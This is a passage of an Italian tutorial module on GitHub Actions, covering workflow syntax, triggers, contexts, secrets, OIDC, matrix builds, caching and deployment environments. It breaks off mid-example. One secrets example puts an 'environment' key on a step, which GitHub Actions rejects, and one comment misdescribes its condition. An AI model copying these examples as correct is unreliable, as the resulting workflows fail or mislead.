---
corso: "GitHub e Git Actions"
fase: "4 — GitHub Actions"
modulo: 4
titolo: "GitHub Actions — Guida Completa"
versione: "GitHub Actions 2026"
livello: "Avanzato"
prerequisiti: ["01-fondamenti-git", "03-piattaforma-github", "Basi di YAML"]
obiettivi:
  - "Scrivere workflow YAML con trigger, job, step e condizioni"
  - "Configurare matrix build per testing multi-piattaforma e multi-versione"
  - "Gestire secrets, variabili d'ambiente e permessi GITHUB_TOKEN"
  - "Creare composite actions e reusable workflow per standardizzazione"
  - "Implementare caching, artifact e ottimizzazione dei tempi CI/CD"
tag: [github-actions, ci-cd, workflow, yaml, matrix, secrets, caching, composite-actions, reusable-workflows, runner]
---

# GitHub Actions — Guida Completa

> **Modulo 04** · **Aggiornamento:** 2026-05-24

> **Obiettivi di apprendimento**
>
> Al termine di questo modulo sarai in grado di:
>
> 1. Scrivere workflow YAML completi con trigger (push, pull_request, schedule, workflow_dispatch) e condizioni
> 2. Configurare matrix build per testare su combinazioni multiple di OS, linguaggi e versioni
> 3. Gestire secrets, variabili d'ambiente e permessi GITHUB_TOKEN con principio del minimo privilegio
> 4. Creare composite actions e reusable workflow (`workflow_call`) per ridurre duplicazione
> 5. Ottimizzare le pipeline con caching delle dipendenze, artifact e concurrency management

## Idee guida
1. **Workflow YAML in `.github/workflows/`.**
2. **Triggers: push, pull_request, schedule, workflow_dispatch, repository_dispatch.**
3. **Matrix builds per multi-platform/multi-version.**
4. **Hosted vs self-hosted runner: trade-off.**


---

## Indice

1. [Panoramica](#panoramica)
2. [Fondamenti Workflow](#fondamenti-workflow)
3. [Jobs e Steps](#jobs-e-steps)
4. [Espressioni e Contesti](#espressioni-e-contesti)
5. [Variabili d'Ambiente e Secrets](#variabili-dambiente-e-secrets)
6. [Matrix Strategy](#matrix-strategy)
7. [Caching e Artifacts](#caching-e-artifacts)
8. [Environments e Deployment](#environments-e-deployment)
9. [Reusable Workflows](#reusable-workflows)
10. [Composite Actions](#composite-actions)
11. [Self-Hosted Runners](#self-hosted-runners)
12. [Pattern e Ricette CI/CD](#pattern-e-ricette-cicd)
13. [Ottimizzazione e Costi](#ottimizzazione-e-costi)
14. [Troubleshooting](#troubleshooting)
15. [Best Practices](#best-practices)

---

## Panoramica

GitHub Actions e' la piattaforma nativa di CI/CD integrata direttamente in GitHub. Lanciata nel novembre 2019 in versione stabile, ha rivoluzionato il modo in cui gli sviluppatori automatizzano i propri flussi di lavoro, eliminando la necessita' di strumenti esterni come Jenkins, Travis CI o CircleCI per la maggior parte dei casi d'uso.

La piattaforma permette di definire pipeline di automazione attraverso file YAML posizionati nel repository stesso, seguendo il principio di **Configuration as Code**. Ogni pipeline (chiamata **workflow**) viene eseguita in risposta a eventi specifici del repository: un push, una pull request, la creazione di un release, oppure un trigger manuale o schedulato.

**Caratteristiche principali:**

- **Integrazione nativa** con GitHub: accesso diretto a issue, pull request, release, packages e tutto l'ecosistema GitHub senza configurazione aggiuntiva.
- **Marketplace** con oltre 20.000 actions predefinite create dalla community e da vendor ufficiali.
- **Runner hosted** da GitHub (Ubuntu, Windows, macOS) oppure **self-hosted** su infrastruttura propria.
- **Supporto multi-linguaggio** e multi-piattaforma senza restrizioni.
- **Gestione secrets** integrata con crittografia automatica.
- **Environments** con regole di protezione per deployment controllati.
- **Minuti gratuiti** inclusi in ogni piano GitHub (2.000 minuti/mese per i repository pubblici e privati con piano Free).

GitHub Actions si basa su un modello a eventi (event-driven): ogni workflow viene attivato da uno o piu' eventi, esegue uno o piu' **jobs** in parallelo o in sequenza, e ogni job e' composto da una serie ordinata di **steps**. Ogni step puo' eseguire un comando shell direttamente oppure utilizzare una action predefinita dal marketplace o dal repository stesso.

---

## Fondamenti Workflow

### Struttura File YAML

Tutti i workflow devono risiedere nella directory `.github/workflows/` alla radice del repository. GitHub riconosce automaticamente qualsiasi file `.yml` o `.yaml` presente in questa directory e lo registra come workflow.

```
mio-progetto/
├── .github/
│   └── workflows/
│       ├── ci.yml            # Pipeline di integrazione continua
│       ├── cd.yml            # Pipeline di deployment
│       ├── codeql.yml        # Analisi sicurezza
│       └── scheduled.yml     # Task pianificati
├── src/
├── tests/
└── package.json
```

### Anatomia Completa di un Workflow

Un workflow YAML e' composto da quattro sezioni principali: `name`, `on`, `permissions` (opzionale) e `jobs`.

```yaml
# Nome del workflow (visibile nella tab Actions di GitHub)
name: CI Pipeline

# Trigger: quando questo workflow deve essere eseguito
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# Permessi del GITHUB_TOKEN per questo workflow
permissions:
  contents: read
  pull-requests: write

# Definizione dei jobs
jobs:
  test:
    name: Esegui Test
    runs-on: ubuntu-latest
    steps:
      - name: Checkout codice
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Installa dipendenze
        run: npm ci

      - name: Esegui test
        run: npm test
```

### Trigger / Eventi

GitHub Actions supporta oltre 30 tipi di eventi. I piu' utilizzati sono:

**Eventi di codice:**

```yaml
on:
  # Attivato ad ogni push
  push:
    branches: [main, develop, 'release/**']
    tags: ['v*']
    paths: ['src/**', 'package.json']

  # Attivato su pull request
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]

  # Attivato alla creazione di un release
  release:
    types: [published, created]

  # Attivato al push di un tag
  create:
    # Si attiva per branch e tag creation
```

**Eventi manuali e schedulati:**

```yaml
on:
  # Trigger manuale dalla UI di GitHub
  workflow_dispatch:
    inputs:
      environment:
        description: 'Ambiente di deploy'
        required: true
        default: 'staging'
        type: choice
        options:
          - staging
          - production
      debug_enabled:
        description: 'Abilita modalita debug'
        required: false
        type: boolean
        default: false

  # Schedulazione cron (orario UTC)
  schedule:
    # Ogni giorno alle 02:00 UTC
    - cron: '0 2 * * *'
    # Ogni lunedi alle 09:00 UTC
    - cron: '0 9 * * 1'

  # Trigger da API esterna o da altro workflow
  repository_dispatch:
    types: [deploy-command, build-trigger]
```

**Eventi di workflow:**

```yaml
on:
  # Dopo il completamento di un altro workflow
  workflow_run:
    workflows: ["CI Pipeline"]
    types: [completed]
    branches: [main]

  # Chiamato da un altro workflow (reusable)
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      deploy_key:
        required: true
```

### Filtri (Branches, Paths, Tags)

I filtri permettono di controllare con precisione quando un workflow viene eseguito:

```yaml
on:
  push:
    # Includi solo questi branch
    branches:
      - main
      - 'release/**'      # Qualsiasi branch che inizia con release/
      - '!release/**-beta' # Escludi i branch beta

    # Esegui solo se questi file sono stati modificati
    paths:
      - 'src/**'
      - 'package.json'
      - 'tsconfig.json'

    # Ignora questi file (alternativa a paths)
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.github/**'
      - 'LICENSE'

    # Filtra per tag
    tags:
      - 'v*'             # Solo tag che iniziano con v
      - '!v*-rc*'        # Escludi release candidate
```

> **Nota importante:** Non e' possibile combinare `paths` e `paths-ignore` nello stesso evento. Utilizzare uno dei due approcci.

---

## Jobs e Steps

### Definizione Job e runs-on

Ogni job viene eseguito in un ambiente isolato (runner). GitHub offre runner hosted con diversi sistemi operativi:

| Runner             | Label              | vCPU | RAM   | Disco | Costo/min (privato) |
|--------------------|--------------------|------|-------|-------|---------------------|
| Ubuntu 24.04       | `ubuntu-latest`    | 4    | 16 GB | 14 GB | $0.008              |
| Ubuntu 22.04       | `ubuntu-22.04`     | 4    | 16 GB | 14 GB | $0.008              |
| Windows Server 2022| `windows-latest`   | 4    | 16 GB | 14 GB | $0.016              |
| macOS 14 (Sonoma)  | `macos-latest`     | 3    | 14 GB | 14 GB | $0.080              |
| macOS 13 (Ventura) | `macos-13`         | 4    | 14 GB | 14 GB | $0.080              |

```yaml
jobs:
  test-linux:
    name: Test su Linux
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Esecuzione su Ubuntu"

  test-windows:
    name: Test su Windows
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Esecuzione su Windows"
        shell: pwsh  # PowerShell Core

  test-macos:
    name: Test su macOS
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Esecuzione su macOS"
```

### Steps: uses vs run

Ogni step puo' eseguire un'azione predefinita (`uses`) oppure un comando shell (`run`):

```yaml
steps:
  # uses: riferimento a un'azione predefinita
  - name: Checkout repository
    uses: actions/checkout@v4
    with:
      fetch-depth: 0          # Clona tutta la storia
      token: ${{ secrets.PAT }}

  # run: comando shell diretto
  - name: Installa dipendenze
    run: |
      npm ci
      npm run build
    working-directory: ./frontend
    shell: bash
    env:
      NODE_ENV: production

  # uses con azione dal marketplace
  - name: Upload a S3
    uses: jakejarvis/s3-sync-action@v0.5.1
    with:
      args: --delete --follow-symlinks
    env:
      AWS_S3_BUCKET: ${{ secrets.AWS_S3_BUCKET }}

  # uses con azione locale dal repository
  - name: Azione personalizzata
    uses: ./.github/actions/mia-azione
    with:
      parametro: valore
```

### Job Dependencies (needs)

Per default, tutti i job di un workflow vengono eseguiti **in parallelo**. Per creare dipendenze sequenziali si utilizza la keyword `needs`:

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  # build dipende sia da lint che da test
  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run build

  # deploy dipende da build (e indirettamente da lint e test)
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploy in corso..."
```

In questo esempio, `lint` e `test` vengono eseguiti in parallelo. Solo quando entrambi sono completati con successo, viene avviato `build`. Infine, `deploy` parte solo dopo il completamento di `build`.

### Job Outputs

I job possono produrre output da utilizzare nei job successivi:

```yaml
jobs:
  determine-version:
    runs-on: ubuntu-latest
    # Dichiarazione degli output del job
    outputs:
      version: ${{ steps.get_version.outputs.version }}
      should_deploy: ${{ steps.check.outputs.deploy }}
    steps:
      - uses: actions/checkout@v4

      - name: Determina versione
        id: get_version
        run: |
          VERSION=$(cat package.json | jq -r '.version')
          echo "version=$VERSION" >> $GITHUB_OUTPUT

      - name: Verifica se deployare
        id: check
        run: |
          if [[ "${{ github.ref }}" == "refs/heads/main" ]]; then
            echo "deploy=true" >> $GITHUB_OUTPUT
          else
            echo "deploy=false" >> $GITHUB_OUTPUT
          fi

  deploy:
    needs: determine-version
    if: needs.determine-version.outputs.should_deploy == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Deploy versione ${{ needs.determine-version.outputs.version }}"
```

### Concurrency Control

Il controllo della concorrenza impedisce esecuzioni multiple dello stesso workflow o job:

```yaml
# A livello di workflow
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true  # Cancella le esecuzioni precedenti

# Esempio pratico: evitare deploy simultanei
jobs:
  deploy:
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-${{ github.event.inputs.environment }}
      cancel-in-progress: false  # NON cancellare deploy in corso
```

Il parametro `cancel-in-progress: true` e' particolarmente utile per le pull request: se un nuovo push viene effettuato mentre una CI e' in esecuzione, la precedente viene automaticamente cancellata, risparmiando minuti.

### Timeout e continue-on-error

```yaml
jobs:
  test-integration:
    runs-on: ubuntu-latest
    # Timeout massimo per il job (default: 360 minuti)
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Test che potrebbe fallire
        continue-on-error: true  # Il job continua anche se questo step fallisce
        run: npm run test:flaky

      - name: Test critici
        timeout-minutes: 10  # Timeout per singolo step
        run: npm run test:integration

  # Job opzionale che non blocca il workflow
  optional-check:
    runs-on: ubuntu-latest
    continue-on-error: true  # A livello di job
    steps:
      - run: npm run test:experimental
```

### Conditional Execution (if)

La keyword `if` permette di eseguire job o step condizionalmente:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    # Esegui solo sul branch main
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4

      # Esegui solo se NON e' una pull request
      - name: Deploy produzione
        if: github.event_name != 'pull_request'
        run: ./deploy.sh production

      # Esegui solo se un file specifico e' stato modificato
      - name: Rebuild documentazione
        if: contains(github.event.head_commit.message, '[docs]')
        run: npm run docs:build

      # Esegui sempre, anche se uno step precedente ha fallito
      - name: Cleanup
        if: always()
        run: ./cleanup.sh

      # Esegui solo in caso di fallimento
      - name: Notifica errore
        if: failure()
        run: curl -X POST ${{ secrets.SLACK_WEBHOOK }} -d '{"text":"Build fallita!"}'
```

---

## Espressioni e Contesti

### Sintassi ${{ }}

Le espressioni in GitHub Actions sono racchiuse in `${{ }}` e vengono valutate a runtime. Possono essere utilizzate in qualsiasi campo del workflow YAML:

```yaml
env:
  MY_VAR: ${{ github.repository }}

steps:
  - name: Step con espressione nel nome - ${{ github.sha }}
    run: echo "Ref corrente: ${{ github.ref }}"
    if: ${{ github.event_name == 'push' }}
```

> **Nota:** Nella keyword `if`, il wrapper `${{ }}` e' opzionale. Si puo' scrivere sia `if: github.ref == 'refs/heads/main'` sia `if: ${{ github.ref == 'refs/heads/main' }}`.

### Contesti Principali

GitHub Actions fornisce diversi contesti che espongono informazioni sull'esecuzione:

**github context** — Informazioni sull'evento e il repository:

```yaml
steps:
  - run: |
      echo "Repository: ${{ github.repository }}"        # owner/repo
      echo "Owner: ${{ github.repository_owner }}"        # owner
      echo "SHA: ${{ github.sha }}"                       # commit SHA completo
      echo "Ref: ${{ github.ref }}"                       # refs/heads/main
      echo "Ref name: ${{ github.ref_name }}"             # main
      echo "Evento: ${{ github.event_name }}"             # push, pull_request
      echo "Actor: ${{ github.actor }}"                   # chi ha triggerato
      echo "Run ID: ${{ github.run_id }}"                 # ID univoco esecuzione
      echo "Run number: ${{ github.run_number }}"         # numero progressivo
      echo "Workflow: ${{ github.workflow }}"              # nome del workflow
      echo "Server URL: ${{ github.server_url }}"         # https://github.com
      echo "API URL: ${{ github.api_url }}"               # https://api.github.com
```

**env context** — Variabili d'ambiente:

```yaml
env:
  APP_NAME: mia-app

steps:
  - run: echo "${{ env.APP_NAME }}"
```

**secrets context** — Accesso ai secrets crittografati:

```yaml
steps:
  - run: echo "Token disponibile"
    env:
      API_KEY: ${{ secrets.API_KEY }}
      # I secrets vengono mascherati automaticamente nei log
```

**vars context** — Variabili di configurazione (non crittografate):

```yaml
steps:
  - run: echo "Ambiente: ${{ vars.DEPLOY_ENVIRONMENT }}"
```

**steps context** — Output degli step precedenti:

```yaml
steps:
  - name: Genera valore
    id: generatore
    run: echo "risultato=42" >> $GITHUB_OUTPUT

  - name: Usa valore
    run: echo "Il risultato e': ${{ steps.generatore.outputs.risultato }}"
```

**job context** — Informazioni sul job corrente:

```yaml
steps:
  - run: echo "Stato job: ${{ job.status }}"  # success, failure, cancelled
```

**runner context** — Informazioni sull'ambiente di esecuzione:

```yaml
steps:
  - run: |
      echo "OS: ${{ runner.os }}"           # Linux, Windows, macOS
      echo "Arch: ${{ runner.arch }}"       # X86, X64, ARM, ARM64
      echo "Temp: ${{ runner.temp }}"       # directory temporanea
      echo "Tool cache: ${{ runner.tool_cache }}"
```

**needs context** — Output dei job precedenti (vedi sezione Job Outputs sopra).

**inputs context** — Parametri di workflow_dispatch o workflow_call:

```yaml
on:
  workflow_dispatch:
    inputs:
      log_level:
        description: 'Livello di log'
        required: true
        default: 'info'

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Log level: ${{ inputs.log_level }}"
```

### Funzioni Integrate

```yaml
steps:
  - name: Esempi di funzioni
    run: echo "Funzioni dimostrate"
    # Ogni if mostra una funzione diversa
    if: |
      contains('hello world', 'hello') &&
      startsWith(github.ref, 'refs/heads/') &&
      endsWith(github.repository, '-app')

  - name: format()
    run: echo "${{ format('Hello {0}, benvenuto in {1}!', github.actor, github.repository) }}"

  - name: toJSON e fromJSON
    run: |
      echo "Evento completo:"
      echo '${{ toJSON(github.event) }}'

  - name: hashFiles per cache
    run: echo "Hash: ${{ hashFiles('**/package-lock.json') }}"

  # hashFiles supporta pattern multipli
  - name: Hash multipli
    run: echo "Hash: ${{ hashFiles('**/package-lock.json', '**/yarn.lock') }}"
```

### Operatori Logici

```yaml
if: |
  (github.event_name == 'push' && github.ref == 'refs/heads/main') ||
  (github.event_name == 'pull_request' && github.event.pull_request.draft == false)

# Negazione
if: "!contains(github.event.head_commit.message, '[skip ci]')"

# Confronti
if: github.event.pull_request.additions > 100

# Operatore ternario (non supportato direttamente, ma simulabile)
env:
  ENV_NAME: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

### Status Check Functions

```yaml
steps:
  - name: Step principale
    id: main_step
    run: npm test

  # Esegui SEMPRE, indipendentemente dal risultato precedente
  - name: Cleanup
    if: always()
    run: docker-compose down

  # Esegui solo se uno step precedente ha fallito
  - name: Notifica fallimento
    if: failure()
    run: echo "Qualcosa e' andato storto"

  # Esegui solo se tutti gli step precedenti hanno avuto successo (comportamento default)
  - name: Deploy
    if: success()
    run: ./deploy.sh

  # Esegui solo se il workflow e' stato cancellato
  - name: Gestione cancellazione
    if: cancelled()
    run: echo "Workflow cancellato dall'utente"
```

---

## Variabili d'Ambiente e Secrets

### Variabili env a Diversi Livelli

Le variabili d'ambiente possono essere definite a tre livelli diversi, con scope crescente di specificita':

```yaml
# Livello WORKFLOW: disponibili in tutti i job e step
env:
  APP_NAME: mia-applicazione
  NODE_ENV: production

jobs:
  build:
    runs-on: ubuntu-latest
    # Livello JOB: disponibili in tutti gli step di questo job
    env:
      BUILD_TARGET: linux
      CI: true
    steps:
      - name: Compila
        # Livello STEP: disponibili solo in questo step
        env:
          OPTIMIZATION: aggressive
        run: |
          echo "App: $APP_NAME"          # dal workflow
          echo "Target: $BUILD_TARGET"   # dal job
          echo "Opt: $OPTIMIZATION"      # dallo step

      - name: Altro step
        # $OPTIMIZATION non e' disponibile qui
        run: echo "Target: $BUILD_TARGET"
```

**Variabili d'ambiente dinamiche** — Impostare variabili a runtime per step successivi:

```yaml
steps:
  - name: Imposta variabili
    run: |
      echo "BUILD_VERSION=1.2.3" >> $GITHUB_ENV
      echo "BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> $GITHUB_ENV

  - name: Usa variabili
    run: |
      echo "Versione: $BUILD_VERSION"
      echo "Data: $BUILD_DATE"
```

### Variabili Repository e Organization (vars context)

Le **configuration variables** (introdotte nel 2023) sono variabili non crittografate configurabili dalla UI di GitHub in Settings > Secrets and variables > Actions > Variables.

```yaml
steps:
  # Variabili definite a livello repository
  - run: |
      echo "URL base: ${{ vars.API_BASE_URL }}"
      echo "Ambiente: ${{ vars.DEFAULT_ENVIRONMENT }}"

  # Variabili definite a livello organization (ereditate)
  - run: echo "Org name: ${{ vars.ORG_NAME }}"
```

A differenza dei secrets, le variabili non sono crittografate e sono visibili nei log. Sono ideali per configurazioni non sensibili come URL, nomi di ambiente, feature flag.

### GITHUB_TOKEN

Ogni esecuzione di workflow riceve automaticamente un token `GITHUB_TOKEN` con permessi configurabili:

```yaml
# Permessi restrittivi (raccomandato)
permissions:
  contents: read
  pull-requests: write
  issues: write
  packages: write

jobs:
  esempio:
    runs-on: ubuntu-latest
    steps:
      - name: Commenta sulla PR
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'CI completata con successo!'
            })

      - name: Push immagine Docker
        run: |
          echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
          docker push ghcr.io/${{ github.repository }}/mia-app:latest
```

**Permessi disponibili per GITHUB_TOKEN:**

| Scope            | Accessi                                      |
|------------------|----------------------------------------------|
| `actions`        | Gestione workflow e actions                   |
| `contents`       | Codice sorgente del repository                |
| `issues`         | Issue management                              |
| `pull-requests`  | Pull request management                       |
| `packages`       | GitHub Packages (read/write)                  |
| `deployments`    | Deployment status                             |
| `statuses`       | Commit status                                 |
| `checks`         | Check runs e check suites                     |
| `security-events`| Code scanning e secret scanning               |
| `id-token`       | OIDC token per cloud authentication           |

### Secrets (Repository, Environment, Organization)

I secrets sono valori crittografati disponibili solo a runtime nei workflow. Non appaiono mai nei log (vengono mascherati con `***`).

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # Secrets del repository (Settings > Secrets > Actions)
      - name: Configura AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 ls

      # Secrets dell'environment (Settings > Environments > nome > Secrets)
      - name: Deploy a produzione
        environment: production
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}  # secret di environment
        run: ./deploy.sh
```

**Gerarchia dei secrets:** Organization > Repository > Environment. Se uno stesso nome e' definito a piu' livelli, il livello piu' specifico (environment) ha la precedenza.

### OIDC per Cloud Authentication

L'autenticazione OIDC (OpenID Connect) elimina la necessita' di secrets statici per l'accesso ai cloud provider:

```yaml
permissions:
  id-token: write   # Necessario per OIDC
  contents: read

jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    steps:
      - name: Configura credenziali AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: eu-west-1
          # Nessun secret necessario! L'autenticazione avviene via JWT

      - name: Deploy a AWS
        run: aws ecs update-service --cluster prod --service app --force-new-deployment

  deploy-azure:
    runs-on: ubuntu-latest
    steps:
      - name: Login Azure via OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

  deploy-gcp:
    runs-on: ubuntu-latest
    steps:
      - name: Autenticazione GCP via OIDC
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/pool/providers/provider'
          service_account: 'deploy@progetto.iam.gserviceaccount.com'
```

---

## Matrix Strategy

La matrix strategy permette di eseguire lo stesso job con combinazioni diverse di parametri, creando automaticamente multiple istanze del job.

### Sintassi Base

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20, 22]
        os: [ubuntu-latest, windows-latest]
    # Genera 6 combinazioni: 3 versioni x 2 OS
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
      - run: npm ci && npm test
```

### Include ed Exclude

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [18, 20, 22]

    # Escludi combinazioni specifiche
    exclude:
      - os: macos-latest
        node: 18  # Non testare Node 18 su macOS

    # Aggiungi combinazioni extra con parametri aggiuntivi
    include:
      - os: ubuntu-latest
        node: 22
        experimental: true    # Parametro personalizzato aggiuntivo
      - os: ubuntu-latest
        node: 23              # Aggiunge una versione extra solo per Ubuntu
        experimental: true
```

### Controllo Fallimento e Parallelismo

```yaml
strategy:
  # Se true (default), cancella tutti i job della matrice se uno fallisce
  fail-fast: false

  # Numero massimo di job eseguiti in parallelo (default: tutti)
  max-parallel: 3

  matrix:
    version: [10, 12, 14, 16, 18, 20]
```

### Esempi Pratici

**Node.js multi-version cross-platform:**

```yaml
name: CI Cross-Platform

on: [push, pull_request]

jobs:
  test:
    name: Node ${{ matrix.node }} su ${{ matrix.os }}
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: 'npm'

      - name: Installa dipendenze
        run: npm ci

      - name: Esegui linter
        run: npm run lint

      - name: Esegui test
        run: npm test

      - name: Build
        run: npm run build
```

**Python multi-version con servizi:**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.10', '3.11', '3.12']
        database: [postgres, mysql]

    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: test_password
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v4

      - name: Setup Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Installa dipendenze
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-test.txt

      - name: Esegui test
        env:
          DATABASE_URL: postgresql://postgres:test_password@localhost:5432/test_db
        run: pytest --cov --cov-report=xml
```

**Matrix dinamica (generata a runtime):**

```yaml
jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
      - id: set-matrix
        run: |
          # Genera la matrice basandosi sui package presenti
          PACKAGES=$(ls packages/ | jq -R -s -c 'split("\n") | map(select(length > 0))')
          echo "matrix={\"package\":$PACKAGES}" >> $GITHUB_OUTPUT

  test:
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - run: npm test --workspace=packages/${{ matrix.package }}
```

---

## Caching e Artifacts

### actions/cache

Il caching riduce drasticamente i tempi di esecuzione evitando di riscaricare dipendenze ad ogni run:

```yaml
steps:
  - uses: actions/checkout@v4

  - name: Cache dipendenze npm
    uses: actions/cache@v4
    with:
      # Directory da memorizzare in cache
      path: ~/.npm
      # Chiave univoca: se cambia package-lock.json, la cache viene rigenerata
      key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
      # Chiavi di fallback: usa una cache parziale se quella esatta non esiste
      restore-keys: |
        ${{ runner.os }}-npm-

  - run: npm ci
```

**Cache per diversi ecosistemi:**

```yaml
# Cache per pip (Python)
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
    restore-keys: |
      ${{ runner.os }}-pip-

# Cache per Maven (Java)
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      ${{ runner.os }}-maven-

# Cache per Go modules
- uses: actions/cache@v4
  with:
    path: |
      ~/go/pkg/mod
      ~/.cache/go-build
    key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
    restore-keys: |
      ${{ runner.os }}-go-

# Cache per Gradle
- uses: actions/cache@v4
  with:
    path: |
      ~/.gradle/caches
      ~/.gradle/wrapper
    key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
    restore-keys: |
      ${{ runner.os }}-gradle-
```

> **Suggerimento:** Molte actions di setup (come `actions/setup-node@v4`, `actions/setup-python@v5`) offrono un parametro `cache` integrato che gestisce automaticamente il caching: `cache: 'npm'`, `cache: 'pip'`, ecc.

### Artifacts

Gli artifacts permettono di salvare file prodotti durante l'esecuzione e condividerli tra job o scaricarli dalla UI di GitHub:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      # Upload artifact
      - name: Carica build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7            # Mantieni per 7 giorni (default: 90)
          if-no-files-found: error     # error, warn, ignore
          compression-level: 6         # 0-9 (0 = nessuna compressione)

      # Upload report di test
      - name: Carica report test
        if: always()  # Carica anche se i test falliscono
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: |
            coverage/
            test-results.xml
          retention-days: 30

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      # Download artifact dal job precedente
      - name: Scarica build artifact
        uses: actions/download-artifact@v4
        with:
          name: build-output
          path: ./dist

      - name: Deploy
        run: |
          ls -la ./dist
          ./deploy.sh ./dist
```

**Download di tutti gli artifacts:**

```yaml
- name: Scarica tutti gli artifacts
  uses: actions/download-artifact@v4
  # Senza specificare 'name', scarica TUTTI gli artifacts
  with:
    path: ./all-artifacts
    # Ogni artifact viene salvato in una sottodirectory con il suo nome
```

---

## Environments e Deployment

### Definizione Environment

Gli environments in GitHub Actions rappresentano target di deployment (staging, production, ecc.) e possono avere regole di protezione specifiche. Si configurano in Settings > Environments.

### Protection Rules

Ogni environment puo' avere:

- **Required reviewers:** fino a 6 persone/team che devono approvare il deployment.
- **Wait timer:** ritardo obbligatorio (0-43200 minuti) prima dell'esecuzione.
- **Branch restrictions:** solo branch specifici possono deployare in questo environment.
- **Custom deployment protection rules:** webhook personalizzati per validazioni esterne.

### Environment Secrets e Variables

Ogni environment puo' avere i propri secrets e variabili che sovrascrivono quelli del repository.

### Deployment Workflow con Approvazione

```yaml
name: Deploy Pipeline

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  test:
    name: Test Suite
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  build:
    name: Build Applicazione
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: app-build
          path: dist/

  deploy-staging:
    name: Deploy a Staging
    needs: build
    runs-on: ubuntu-latest
    environment:
